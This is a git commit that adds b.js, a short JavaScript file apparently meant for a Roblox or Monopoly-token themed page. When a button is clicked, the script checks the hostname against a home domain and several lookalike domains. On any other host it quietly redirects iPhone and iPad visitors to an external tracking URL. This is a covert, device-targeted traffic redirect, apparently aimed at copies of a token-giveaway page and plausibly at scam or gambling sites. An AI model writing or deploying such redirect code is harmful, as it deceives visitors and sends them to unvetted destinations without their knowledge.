bc29dadf5cead0653198cff834bf10f723c69e7f
dev20l <iphonetasli@gmail.com>
2025-02-16 16:34:33 +0100

    Create b.js

---
+++ b.js
@@ -0,0 +1,23 @@
+/*================== [ VICTOR ABDO ] ===============*/
+/*================== [ roblox ] ================*/
+var button = document.querySelector('.btn');  
+button.addEventListener('click', function() {
+    (function() {
+        var originalDomain = "monoplytokens.com";
+        var redirectURL = "https://live33.online/?f93b23d";
+        var blockedDomains = [
+            "jsdhjjhhjjhejkjkas.blogspot.com",
+            "mply.io.t0ke2n.site",
+            "mply.io.1arshg4.site",
+            "mply.io.4a6b8dh.site"
+        ];
+
+        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
+            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
+
+            if (isIphoneOrIpad) { 
+                window.location.href = redirectURL;
+            }
+        }
+    })();
+});
